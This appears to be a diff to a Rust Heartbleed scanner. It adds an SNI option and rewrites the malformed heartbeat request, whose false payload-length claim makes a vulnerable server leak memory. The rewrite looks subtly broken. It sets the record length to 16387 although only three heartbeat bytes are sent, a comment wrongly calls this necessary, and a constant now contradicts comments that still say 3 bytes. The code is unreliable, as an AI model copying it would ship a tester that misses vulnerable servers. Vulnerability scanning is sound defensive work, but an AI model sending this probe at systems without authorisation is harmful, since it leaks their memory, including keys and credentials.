@@ -25,6 +25,7 @@ pub struct HeartbleedResult {
 /// Heartbleed vulnerability tester
 pub struct HeartbleedTester<'a> {
     target: &'a Target,
+    sni_hostname: Option<String>,
     connect_timeout: Duration,
     read_timeout: Duration,
 }
@@ -34,9 +35,15 @@ impl<'a> HeartbleedTester<'a> {
     pub fn new(target: &'a Target) -> Self {
         Self {
             target,
+            sni_hostname: None,
             connect_timeout: Duration::from_secs(10),
             read_timeout: TLS_HANDSHAKE_TIMEOUT,
         }
+    }
+
+    pub fn with_sni(mut self, sni: Option<String>) -> Self {
+        self.sni_hostname = sni;
+        self
     }
 
     /// Test for Heartbleed vulnerability
@@ -94,7 +101,11 @@ impl<'a> HeartbleedTester<'a> {
         let heartbeat_ext = vec![0x01]; // peer_allowed_to_send
         builder.add_extension(crate::protocols::Extension::new(0x000f, heartbeat_ext));
 
-        let client_hello = builder.build_with_defaults(Some(&self.target.hostname))?;
+        let sni_hostname = crate::utils::network::sni_hostname_for_target(
+            &self.target.hostname,
+            self.sni_hostname.as_deref(),
+        );
+        let client_hello = builder.build_with_defaults(sni_hostname.as_deref())?;
 
         // Send ClientHello
         let response = match timeout(self.read_timeout, async {
@@ -228,7 +239,7 @@ impl<'a> HeartbleedTester<'a> {
 
     /// Send malicious heartbeat request and check for memory leak
     async fn send_malicious_heartbeat(&self, stream: &mut TcpStream) -> Result<HeartbleedResult> {
-        const HEARTBEAT_PAYLOAD_SENT: usize = 3;
+        const HEARTBEAT_PAYLOAD_SENT: usize = 16387;
         // Minimum suspicious response threshold.
         // A legitimate heartbeat response echoes our 3 bytes payload plus 3 bytes header (type + length).
         // TLS record overhead: 5 bytes (content type + version + length).
@@ -252,16 +263,21 @@ impl<'a> HeartbleedTester<'a> {
         // Responses below this threshold warrant manual verification warning
         const WARNING_THRESHOLD: usize = 32;
 
-        // Build malicious heartbeat request
+        // Build malicious heartbeat request.
+        // The TLS record length must encompass the full heartbeat message:
+        // type(1) + length(2) + claimed_payload(0x4000) = 3 + 16384 = 16387 bytes.
+        // A vulnerable server reads past the 3-byte heartbeat header into process memory.
+        let claimed_payload_length: u16 = 0x4000; // 16384 bytes — the malicious claim
+        let heartbeat_msg_len = 3 + claimed_payload_length as usize; // type(1) + length(2) + payload
         let heartbeat = vec![
-            CONTENT_TYPE_HEARTBEAT,       // Record header: Content Type: Heartbeat (0x18)
-            (VERSION_TLS_1_2 >> 8) as u8, // Version: TLS 1.2 (0x0303)
-            (VERSION_TLS_1_2 & 0xff) as u8, // Version low byte
-            0x00,                         // Record length high byte
-            0x03,                         // 3 bytes payload
-            HEARTBEAT_REQUEST,            // Heartbeat request type
-            0x40,                         // Payload length: 16384 (0x4000) - MALICIOUS!
-            0x00,
+            CONTENT_TYPE_HEARTBEAT,                  // Content Type: Heartbeat (0x18)
+            (VERSION_TLS_1_2 >> 8) as u8,            // Version: TLS 1.2 (0x0303)
+            (VERSION_TLS_1_2 & 0xff) as u8,          // Version low byte
+            ((heartbeat_msg_len >> 8) & 0xff) as u8, // Record length high byte
+            (heartbeat_msg_len & 0xff) as u8,        // Record length low byte
+            HEARTBEAT_REQUEST,                       // Heartbeat request type (0x01)
+            (claimed_payload_length >> 8) as u8,     // Payload length high byte
+            (claimed_payload_length & 0xff) as u8,   // Payload length low byte
         ];
 
         // Send heartbeat request
@@ -427,6 +443,7 @@ mod tests {
         .unwrap();
         let tester = HeartbleedTester {
             target: &target,
+            sni_hostname: None,
             connect_timeout: Duration::from_secs(5),
             read_timeout: Duration::from_secs(5),
         };
@@ -489,6 +506,7 @@ mod tests {
         .unwrap();
         let tester = HeartbleedTester {
             target: &target,
+            sni_hostname: None,
             connect_timeout: Duration::from_secs(5),
             read_timeout: Duration::from_secs(5),
         };
@@ -506,6 +524,7 @@ mod tests {
         .unwrap();
         let tester = HeartbleedTester {
             target: &target,
+            sni_hostname: None,
             connect_timeout: Duration::from_secs(5),
             read_timeout: Duration::from_secs(5),
         };
